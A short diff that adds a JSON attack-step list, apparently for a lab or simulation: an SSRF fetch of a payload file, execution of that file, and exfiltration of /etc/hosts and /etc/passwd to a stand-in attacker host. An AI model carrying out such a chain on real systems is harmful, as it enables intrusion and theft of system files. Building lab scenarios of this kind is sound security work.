@@ -1,0 +1,21 @@
+[
+  {
+    "action": "ssrf_fetch_payload",
+    "data": {
+      "url": "http://127.0.0.1:8080/zero_day_payload.py"
+    }
+  },
+  {
+    "action": "execute_payload",
+    "data": {
+      "payload_file": "fetched_payload.py"
+    }
+  },
+  {
+    "action": "exfil",
+    "data": {
+      "target": "http://attacker.your-lab.local/exfil",
+      "files": ["/etc/hosts", "/etc/passwd"]
+    }
+  }
+]
